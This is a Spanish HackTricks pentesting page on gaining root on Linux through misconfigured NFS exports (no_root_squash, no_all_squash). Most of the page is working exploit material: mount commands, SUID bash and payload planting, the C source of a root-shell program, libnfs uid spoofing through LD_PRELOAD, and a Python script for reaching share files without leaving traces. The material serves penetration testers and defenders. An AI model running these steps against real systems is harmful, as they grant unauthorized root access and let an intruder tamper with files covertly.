<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>


Lee el archivo _ **/etc/exports** _, si encuentras algún directorio configurado como **no\_root\_squash**, entonces puedes **acceder** a él desde **como cliente** y **escribir dentro** de ese directorio **como** si fueras el **root** local de la máquina.

**no\_root\_squash**: Esta opción básicamente otorga autoridad al usuario root en el cliente para acceder a archivos en el servidor NFS como root. Y esto puede tener serias implicaciones de seguridad.

**no\_all\_squash:** Esto es similar a la opción **no\_root\_squash** pero se aplica a **usuarios que no son root**. Imagina, tienes una shell como usuario nobody; revisas el archivo /etc/exports; la opción no\_all\_squash está presente; revisas el archivo /etc/passwd; emulas un usuario que no es root; creas un archivo suid como ese usuario (montando usando nfs). Ejecutas el suid como usuario nobody y te conviertes en un usuario diferente.

# Escalada de Privilegios

## Explotación Remota

Si has encontrado esta vulnerabilidad, puedes explotarla:

* **Montando ese directorio** en una máquina cliente, y **copiando como root** dentro de la carpeta montada el binario **/bin/bash** y dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montar ese directorio** en una máquina cliente, y **como root copiar** dentro de la carpeta montada nuestro payload compilado que abusará del permiso SUID, darle derechos **SUID**, y **ejecutar desde la** máquina víctima ese binario (puedes encontrar aquí algunos [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Explotación Local

{% hint style="info" %}
Ten en cuenta que si puedes crear un **túnel desde tu máquina hasta la máquina víctima, aún puedes usar la versión Remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
El siguiente truco es en caso de que el archivo `/etc/exports` **indique una IP**. En este caso, **no podrás usar** en ningún caso el **exploit remoto** y necesitarás **abusar de este truco**.\
Otro requisito necesario para que el exploit funcione es que **la exportación dentro de `/etc/export`** **debe estar utilizando la bandera `insecure`**.\
\--_No estoy seguro de que si `/etc/export` está indicando una dirección IP, este truco funcionará_--
{% endhint %}

## Información Básica

El escenario implica explotar un recurso NFS montado en una máquina local, aprovechando una falla en la especificación NFSv3 que permite al cliente especificar su uid/gid, lo que potencialmente habilita el acceso no autorizado. La explotación implica el uso de [libnfs](https://github.com/sahlberg/libnfs), una biblioteca que permite la falsificación de llamadas RPC de NFS.

### Compilación de la Biblioteca

Los pasos de compilación de la biblioteca pueden requerir ajustes según la versión del kernel. En este caso específico, las llamadas al sistema fallocate estaban comentadas. El proceso de compilación implica los siguientes comandos:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Realización del Exploit

El exploit implica crear un programa C simple (`pwn.c`) que eleva los privilegios a root y luego ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el recurso compartido con suid root, utilizando `ld_nfs.so` para falsificar el uid en las llamadas RPC:

1. **Compilar el código del exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Colocar el exploit en el recurso compartido y modificar sus permisos falsificando el uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Ejecutar el exploit para obtener privilegios de root:**
```bash
/mnt/share/a.out
#root
```

## Bono: NFShell para Acceso Sigiloso a Archivos
Una vez obtenido el acceso root, para interactuar con el recurso compartido NFS sin cambiar la propiedad (para evitar dejar rastros), se utiliza un script de Python (nfsh.py). Este script ajusta el uid para que coincida con el del archivo al que se accede, permitiendo la interacción con archivos en el recurso compartido sin problemas de permisos:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ejecutar como:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# Referencias
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
